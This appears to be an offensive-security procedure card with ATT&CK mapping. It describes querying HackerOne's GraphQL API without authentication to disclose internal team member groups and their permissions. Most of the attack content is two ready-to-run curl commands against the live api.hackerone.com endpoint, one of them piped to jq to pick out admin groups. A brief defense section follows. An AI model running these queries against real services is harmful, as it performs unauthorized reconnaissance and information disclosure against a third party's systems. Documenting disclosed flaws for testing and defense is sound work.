---
id: b2c3d4e5-f6g7-8901-bcde-f23456789012
tags:
  - graphql
  - information-disclosure
  - api
  - authorization-bypass
type: procedure
tools: []
tactics:
  - '[[Initial Access]]'
commands:
  - '[[commands/curl-graphql-team-query]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T12:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T17:26:00.031Z'
skill_level: intermediate
impact_level: medium
detection_risk: low
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Query-GraphQL-API-for-Unauthorized-Team-Member-Groups

## Summary

This procedure exploits an authorization flaw in a GraphQL API (as seen in HackerOne's implementation) to query the 'team' object and disclose internal team member groups, including IDs, names, and permissions, without proper authentication. It allows attackers to infer sensitive organizational structures and potential access to private programs.

## Description

The attack targets the 'team' query in the GraphQL schema, specifically the 'team_member_groups' field, which lacks access controls. By specifying a team handle like 'security', an unauthenticated user can retrieve details such as group names ('Admin', 'Support') and permissions ('user_management', 'program_management'). This information disclosure can reveal internal hierarchies and enable further reconnaissance on program permissions across public and private bug bounty programs. The procedure assumes access to a vulnerable GraphQL endpoint and uses a standard HTTP POST request.

## Requirements

1. Network access to the GraphQL API endpoint (e.g., https://api.hackerone.com/graphql)
2. No authentication tokens required due to the flaw
3. Basic HTTP client (e.g., curl) and knowledge of JSON/GraphQL syntax

## Defense

Defensive measures and detection strategies:

- Implement proper authorization checks on sensitive GraphQL fields using schema directives or resolvers
- Rate-limit unauthenticated queries and monitor for anomalous GraphQL patterns (e.g., queries targeting internal handles like 'security')
- Use introspection disabling and query whitelisting to restrict schema exposure
- Log and alert on queries returning 'team_member_groups' data to unauthorized users

## Objectives

1. Retrieve unauthorized internal team group data to map organizational structure
2. Identify permissions that could lead to inference of private program details
3. Validate the presence of broken access controls in the API

## Instructions

### Step 1: Craft and Send GraphQL Query

**Context**: Prepare a POST request to the GraphQL endpoint with a query targeting the 'team' object by handle. This step bypasses auth to fetch sensitive fields.

**Command** ([[commands/curl-graphql-team-query]]):
```bash
curl -X POST https://api.hackerone.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query": "query {team(handle:\"security\"){id,name,handle,members{total_count},team_member_groups{id,name,permissions}}}"}'
```

> This command sends the JSON-encoded GraphQL query. Successful execution returns team data without errors. If the endpoint requires adjustments, replace the URL accordingly. Expected response includes the 'team_member_groups' array with disclosed details.

### Step 2: Analyze Response for Disclosure

**Context**: Parse the JSON output to extract and review sensitive information, such as group permissions, to assess impact.

**Command** (Use jq for parsing, e.g., pipe output to jq):
```bash
curl -X POST https://api.hackerone.com/graphql -H "Content-Type: application/json" -d '{"query": "query {team(handle:\"security\"){id,name,handle,members{total_count},team_member_groups{id,name,permissions}}}"}' | jq '.data.team.team_member_groups[] | {name, permissions}'
```

> This filters the response to show group names and permissions. Look for indicators like 'Admin' groups or high-privilege permissions to confirm disclosure.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]

### Techniques

- [[Exploit Public-Facing Application]]

### Sub-Techniques


## Commands Used

- [[commands/curl-graphql-team-query]]

## Tools Used


## Tags

- graphql
- information-disclosure
- api
- authorization-bypass
